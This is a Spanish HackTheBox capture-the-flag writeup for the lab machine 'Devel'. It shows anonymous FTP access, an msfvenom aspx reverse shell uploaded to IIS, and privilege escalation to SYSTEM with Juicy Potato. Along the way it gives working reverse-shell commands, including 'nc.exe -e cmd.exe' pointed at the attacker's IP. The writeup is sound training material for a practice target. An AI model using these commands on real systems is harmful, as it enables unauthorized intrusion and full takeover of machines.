---
layout: single
title: Writeup HTB - Maquina Devel
comments: true
excerpt: "La maquina Devel es una maquina windows - Easy, comenzamos enumerando el puerto 21 que podemos acceder con credenciales de anonymous, tambien notamos que los archivos del ftp tiene relacion con la aplicacion web en el puerto 80. Por lo tanto subimos una reverse shell para poder ejecutar comandos en la maquina victima. Por ultimo podmeos escalar privilegios de mucha formas, nosotros usaremos juicy potato aprovechando que tenemos  activado SeImpersonatePrivilege. De esta manera logramos escalar privilegios como nt authority system."
date: 2022-02-09
classes: wide
header:
  teaser: /assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled.png
  teaser_home_page: true
categories:
  - HackTheBox
tags:
  - OSCP  
  - Hacking
  - Easy
  - ftp
  - msfvenom 
  - rlwrap 
  - Juicy Potato
  - impacket-smbserver
---

# HTB - Devel
<p align="center">
<img src="/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled.png">
</p>

## Resumen
<div style="text-align: justify">
La maquina Devel es una maquina windows - Easy, comenzamos enumerando el puerto 21 que podemos acceder con credenciales de anonymous, tambien notamos que los archivos del ftp tiene relacion con la aplicacion web en el puerto 80. Por lo tanto subimos una reverse shell para poder ejecutar comandos en la maquina victima. Por ultimo podmeos escalar privilegios de mucha formas, nosotros usaremos juicy potato aprovechando que tenemos  activado SeImpersonatePrivilege. De esta manera logramos escalar privilegios como nt authority system.
</div>

## Scan Nmap

```
# Nmap 7.80 scan initiated Tue Mar  2 20:23:49 2021 as: nmap -sC -sV -p21,80 -oN Targeted -Pn -vvv devel.htb
Nmap scan report for devel.htb (10.10.10.5)
Host is up, received user-set (0.33s latency).
Scanned at 2021-03-02 20:23:50 -05 for 24s

PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar  2 20:24:14 2021 -- 1 IP address (1 host up) scanned in 24.71 seconds
```

## Enumeracion

### Port 21

haciendo una revision del ftp podemos ver que nmap descubrio que el ftp usa un usuario anonimo, lo que nos permitira revisar su contenido

```
❯ ftp 10.10.10.5                                     
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:abeljm): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: anonymous
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> cd aspnet_client
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

## Port 80

revisamos el puerto 80 y nos encontramos con una aplicacion web que viene por defecto del IIS

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%201.png)

si revisamos el codigo fuente podemos ver que hay archivos que contienen en el ftp, por lo tanto podemos concluir que una relacion entre el ftp y servidor web

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%202.png)

## Reverse Shell - Bajo Privilegios

asi que para obtener una reverse shell podriamos subir nuestra shell en el ftp, asi que generamos nuestra shell con msfvenom

```bash
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.29 LPORT=443 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2692 bytes
```

subimos al ftp nuestra reverse shell que generamos
```bash
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2727 bytes sent in 0.00 secs (4.6943 MB/s)
```

dejamos el puerto 443 en escucha con netcat y accedemos al navegador desde http://10.10.10.5/shell.aspx y logramos obtener nuestra reverse shell
```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.10.5] 49157
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

whoami
whoami
iis apppool\web
```

## Escalacion de Privilegios

### Metodo 1

Juicy Potato

haciendo una enumeracion podemos que ver que esta maquina tiene el privilegio SeImpersonatePrivilege activado, por lo tanto podemos usar juicy potato para escalar y obtener una shell con bajos privilegios

```bash
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone
```

como podemos ver que estamos en una maquina de x86 

```bash
> systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          24/9/2021, 6:18:11 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.desde 
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.473 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.547 MB
Virtual Memory: In Use:    594 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::250
```

por lo tanto nesecitamos descargar una juicy potato de x86 si no, no podremos escalar. Asi que yo descargare dicho binario de esta url

```bash
https://github.com/ivanitlearning/Juicy-Potato-x86/releases
```

una vez descargado renombrare el binario a jp.exe y transferiremos dicho binario a la maquina victima. Asi que ejecutare un servidor de smb en mi maquina de esta manera

```bash
❯ ls
 allPorts   Juicy.Potato.x86.exe   shell.aspx   Targeted  

❯ mv Juicy.Potato.x86.exe jp.exe                  

❯ impacket-smbserver devel .  
Impacket v0.9.24.dev1+20210906.175840.50c76958 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

luego ire a una carpeta donde tenga permisos de lectura y escritura como C:\Windows\Temp

y copiare el binario en dicha carpeta

```bash
copy \\10.10.14.29\\devel\jp.exe .
copy \\10.10.14.29\\devel\jp.exe .
        1 file(s) copied.
```

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%203.png)

tambien pondremos en la maquina victima el binario de netcat, este se encuentra en los respositorio de parrot y kali. En mi caso lo tengo en la siguiente ruta

```bash
❯ locate nc.exe
/home/abeljm/Documents/WorkFolder/Plataformas/htb/devel 
```

tambien procederemos a copiar el netcat

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%204.png)

en nuestra maquina crearemos un shell.bat que contenga este comando

*shell.bat*

```bash
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.29 4444
```

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%205.png)

para poder ejecutar juicy potato, nesecitaremos un CLSID para poder suplatantar el token de un servicio que tenga permisos de NT AUTHORITY\SYSTEM

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%206.png)

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%207.png)

por lo tanto haremos dejaremos un puerto abierto en escucha con netcat en nuestra maquina y en la maquina victima ejecutaremos dicho comando

```bash
jp.exe -p C:\Windows\Temp\shell.bat -l 1337 -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%208.png)

obtenemos nuestra reverse shell con privilegios de NT AUTHORITY\SYSTEM

![Untitled](/assets/images/2022-02-09-writeup-maquina-htb-devel/Untitled%209.png)

gracias por leer este writeup, nos vemos AbelJM.